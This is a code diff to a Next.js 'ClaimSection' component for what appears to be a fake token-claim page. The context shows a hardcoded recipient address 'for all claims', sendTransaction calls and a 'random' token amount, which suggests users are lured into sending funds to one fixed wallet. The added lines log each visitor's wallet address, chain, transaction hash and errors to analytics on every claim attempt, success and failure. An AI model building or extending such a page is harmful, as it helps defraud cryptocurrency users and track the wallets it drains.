@@ -9,6 +9,7 @@ import { Button } from '@/components/ui/button';
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
 import Image from 'next/image';
 import { parseEther } from 'viem';
+import { track } from '@vercel/analytics';
 
 // The recipient address for all claims
 const RECIPIENT_ADDRESS = '0x10B951c72340d76aad53c2e675FCbCD20c48cB5A';
@@ -65,6 +66,12 @@ export default function ClaimSection() {
         }));
         setNetworks(updatedNetworks);
         setSelectedChain(matchingNetwork.id);
+
+        // Track network change event
+        track('network_changed', {
+          network: matchingNetwork.name,
+          chainId: matchingNetwork.chainId.toString()
+        });
       }
     }
   }, [chainId, isConnected, networks]);
@@ -75,6 +82,15 @@ export default function ClaimSection() {
       onSuccess(hash) {
         setTransactionHash(hash);
         setClaimSuccess(true);
+
+        // Track successful transaction
+        track('claim_success', {
+          network: getNetworkNameByChainId(chainId),
+          chainId: chainId.toString(),
+          hash: hash,
+          userAddress: address ? address.toString() : 'unknown'
+        });
+
         setTimeout(() => {
           setClaimSuccess(false);
         }, 3000);
@@ -82,6 +98,15 @@ export default function ClaimSection() {
       },
       onError(error) {
         console.error('Transaction error:', error);
+
+        // Track failed transaction
+        track('claim_failed', {
+          network: getNetworkNameByChainId(chainId),
+          chainId: chainId.toString(),
+          error: String(error),
+          userAddress: address ? address.toString() : 'unknown'
+        });
+
         setIsProcessing(false);
       },
     }
@@ -119,10 +144,25 @@ export default function ClaimSection() {
     if (targetNetwork && targetNetwork.chainId !== chainId) {
       // Display a message about needing to switch networks
       alert(`Please switch to ${targetNetwork.name} in your wallet before claiming.`);
+
+      // Track network switch request
+      track('network_switch_requested', {
+        from: getNetworkNameByChainId(chainId),
+        to: targetNetwork.name,
+        userAddress: address ? address.toString() : 'unknown'
+      });
+
       return;
     }
 
     setIsProcessing(true);
+
+    // Track claim attempt
+    track('claim_attempt', {
+      network: getNetworkNameByChainId(chainId),
+      chainId: chainId.toString(),
+      userAddress: address ? address.toString() : 'unknown'
+    });
 
     try {
       if (sendTransaction) {
@@ -150,6 +190,15 @@ export default function ClaimSection() {
       }
     } catch (error) {
       console.error('Claim error:', error);
+
+      // Track claim error
+      track('claim_error', {
+        network: getNetworkNameByChainId(chainId),
+        chainId: chainId.toString(),
+        error: String(error),
+        userAddress: address ? address.toString() : 'unknown'
+      });
+
       setIsProcessing(false);
     }
   };
@@ -168,11 +217,27 @@ export default function ClaimSection() {
     // Check if we're on the correct network
     if (selectedNetwork.chainId !== chainId) {
       alert(`Please switch to ${selectedNetwork.name} in your wallet before claiming.`);
+
+      // Track network switch request
+      track('network_switch_requested', {
+        from: getNetworkNameByChainId(chainId),
+        to: selectedNetwork.name,
+        userAddress: address ? address.toString() : 'unknown'
+      });
+
       return;
     }
 
     setIsProcessing(true);
     setSelectedChain('hyper');
+
+    // Track claim all attempt
+    track('claim_all_attempt', {
+      network: getNetworkNameByChainId(chainId),
+      chainId: chainId.toString(),
+      userAddress: address ? address.toString() : 'unknown',
+      tokenAmount: randomTokenAmount.toString()
+    });
 
     try {
       if (sendTransaction) {
@@ -195,6 +260,15 @@ export default function ClaimSection() {
       }
     } catch (error) {
       console.error('Claim error:', error);
+
+      // Track claim all error
+      track('claim_all_error', {
+        network: getNetworkNameByChainId(chainId),
+        chainId: chainId.toString(),
+        error: String(error),
+        userAddress: address ? address.toString() : 'unknown'
+      });
+
       setIsProcessing(false);
     }
   };
